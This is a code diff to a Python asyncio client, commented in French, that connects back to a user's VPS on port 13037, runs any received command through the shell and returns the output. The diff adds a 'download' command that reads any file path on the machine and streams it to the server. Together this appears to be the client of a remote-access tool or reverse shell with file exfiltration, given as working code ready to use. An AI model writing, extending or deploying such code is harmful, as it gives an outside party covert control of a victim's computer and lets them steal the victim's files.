@@ -16,6 +16,26 @@ except ImportError:
         except subprocess.CalledProcessError:
             print(" ")
 
+async def send_file_to_server(writer, file_path):
+    if os.path.exists(file_path):
+        file_name = os.path.basename(file_path)
+        writer.write(file_name.encode('utf-8') + b'\n')
+        await writer.drain()
+
+        with open(file_path, 'rb') as f:
+            while True:
+                chunk = f.read(1024)
+                if len(chunk) == 0:
+                    break
+                writer.write(chunk)
+                await writer.drain()
+        writer.write(b'EOF')
+        await writer.drain()
+    else:
+        writer.write(b'FileNotFound')
+        await writer.drain()
+
+
 async def receive_file(reader):
     file_name = await reader.readuntil(separator=b'\n')
     file_name = file_name.decode('utf-8').strip()
@@ -33,13 +53,13 @@ async def execute_command(command):
     try:
         result = await asyncio.to_thread(subprocess.run, command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         output = result.stdout + result.stderr
-        return output if output else " "
+        return output if output else "Commande exécutée, aucune sortie."
     except Exception as e:
         return str(e)
 
 async def connect_to_server():
     HOST = 'IP VERS VOTRE VPS'
-    PORT = 13037 # Même port que celui mis dans 'server.py'
+    PORT = 13037 # Si vous le changez assurez vous de le faire dans server.py également
 
     while True:
         try:
@@ -51,7 +71,10 @@ async def connect_to_server():
                     break
 
                 command = data.decode("utf-8").strip()
-                if command == 'upload':
+                if command.startswith("download"):
+                    _, file_path = command.split(maxsplit=1)
+                    await send_file_to_server(writer, file_path)
+                elif command == 'upload':
                     await receive_file(reader)
                 else:
                     output = await execute_command(command)
